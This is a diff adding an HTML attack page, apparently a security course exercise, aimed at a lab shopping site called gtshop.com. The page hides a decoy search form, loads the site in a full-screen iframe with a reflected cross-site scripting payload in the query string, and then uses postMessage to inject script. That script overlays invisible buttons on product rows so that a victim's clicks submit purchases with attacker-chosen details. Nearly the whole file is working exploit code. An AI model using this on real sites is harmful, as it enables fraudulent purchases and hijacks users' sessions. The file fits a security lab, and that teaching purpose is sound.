@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+  <head>
+
+    <!-- Sources used:
+    https://stackoverflow.com/questions/3065342/how-do-i-iterate-through-table-rows-and-cells-in-javascript
+    https://dev.to/lvidakovic/communicating-with-an-iframe-postmessage-bare-bones-example-3p6p -->
+ 
+    <meta charset="UTF-8" />
+    <title>Clickjacking</title>
+  </head>
+  <body id="body">
+    <div id="my_form">
+    <!-- DO NOT change the form id  -->
+      <form id="clickjack-form" onsubmit="redirect();return false;">
+      <!-- !!! DO NOT MODIFY ANYTHING BELOW THIS COMMENT !!! -->
+        <h1>Georgia Tech Shopping</h1>
+        <input type="text" name="q" id="q" />
+        <input type="submit" id="lucky" value="I'm Feeling Lucky" />
+      </form>
+      <!-- !!! DO NOT MODIFY ANYTHING ABOVE THIS COMMENT !!! -->
+    </div>
+
+
+    <iframe id="searchPage" style="border: none; height: 100%; position: absolute; width: 100%;" frameborder="0" marginheight="0" marginwidth="0"></iframe>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    <script>
+      document.getElementById("clickjack-form").addEventListener("submit",function(){
+      return redirect(); 
+      },false);
+
+      var pageLoaded = true;
+      var searchPage = document.getElementById("searchPage");
+        function redirect(){
+          document.getElementById("my_form").style.display="none";
+          document.getElementById("body").style.margin="0 0 0 0";
+          if (pageLoaded){
+            pageLoaded = false;
+            searchPage.src = 'http://www.gtshop.com/products/lookup?q=' + document.getElementById("q").value + '<script>window.addEventListener("message", evil, false);function evil(msg) { $("div.container").prepend(JSON.parse(msg.data).message)}<\/script>';
+            searchPage.addEventListener("load", () => {
+            searchPage.contentWindow.postMessage(
+              JSON.stringify({ message: document.getElementById("hack").value }), "http://www.gtshop.com" 
+            );
+          });
+        }
+      }
+    </script>
+    <textarea id="hack" style="display: none;"><script type="text/javascript">
+      var tables = document.getElementsByClassName("table table-bordered");
+      var productname = null;
+      var productid = null;
+      if (tables.length > 0){
+        var table = tables[0];
+        for (var i = 1, row; row = table.rows[i]; i++) {
+  
+        for (var j = 0, col; col = row.cells[j]; j++) {
+          if (j == 1){
+            productname = col.innerHTML;
+          }
+          else if (j ==4){
+            if (col.innerHTML.indexOf("id=") > 0){
+              productid = col.innerHTML.split("id=")[1].split("\"")[0];
+            }
+            else{
+              productid = null;
+            }
+          if (productid != null && productname != null){
+            col.innerHTML = '<span id="buyProduct' + productid +'" style="z-index: 100; position: absolute; background-color: #0000FF; height:20px; width:20px; display:inline-block; opacity:0.5;" onclick="purchaseProduct(\'' + productname + '\',\'' + productid + '\');"> </span>' + col.innerHTML;
+          }
+        }
+      }
+    }
+  }
+      function purchaseProduct(productname, productid){
+        document.getElementById("buyProduct" + productid).style.display="none";
+          $("#product_id").val(productid);
+          $("#product_name").val(productname);
+
+          $.ajax({
+                method: "post",
+                url: "/products/buy",
+                data: $("#buy-form").serialize()
+            }).done(function(data) {
+                
+
+                
+            }).fail(function (data) {
+                
+            });
+      }
+
+    </script>
+    <form id="buy-form" enctype="application/x-www-form-urlencoded" style="display: none;">
+                <div class="modal-body">
+                        <div class="form-group">
+                            <label for="mail">Contact mail</label>
+                            <input type="email" class="form-control" name="mail" id="mail" placeholder="Email" value="lol@lol.com">
+                        </div>
+                        <div class="form-group">
+                            <label for="address">Shipping Address</label>
+                            <input type="text" class="form-control" name="address" id="address" placeholder="Shipping address..." value="lol">
+                        </div>
+                        <div class="form-group">
+                            <label for="ship_date">Shipping date</label>
+                            <input type="date" class="form-control" name="ship_date" id="ship_date" placeholder="Shipping date..." value="2011-01-01">
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Contact phone</label>
+                            <input type="tel" class="form-control" name="phone" id="phone" placeholder="Contact phone..." value="1234567">
+                        </div>
+                        <div class="form-group">
+                            <label for="price">Product price</label>
+                            <input type="text" class="form-control" name="price" id="price" value="$81" readonly>
+                        </div>
+                        <input type="hidden" class="form-control" name="product_id" id="product_id" value="1">
+                        <input type="hidden" class="form-control" name="product_name" id="product_name" value="Georgia Tech Mug">
+                </div>
+              </form>
+    </textarea>
+  </body>
+</html> 
